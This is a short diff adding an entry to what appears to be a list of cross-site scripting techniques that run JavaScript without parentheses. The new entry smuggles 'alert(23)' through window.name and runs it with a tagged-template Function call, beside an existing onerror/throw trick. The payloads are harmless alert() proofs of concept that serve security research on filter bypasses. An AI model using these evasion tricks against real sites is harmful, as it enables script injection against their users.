@@ -14,6 +14,17 @@ xss.html
     location=name
 
 ---
+
+[terjanq](https://twitter.com/terjanq)
+
+    window.name="alert(23)";
+    location="xss.html";
+xss.html
+
+    Function`a${name}```
+
+
+---
 [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
 
     onerror=alert;throw 23;
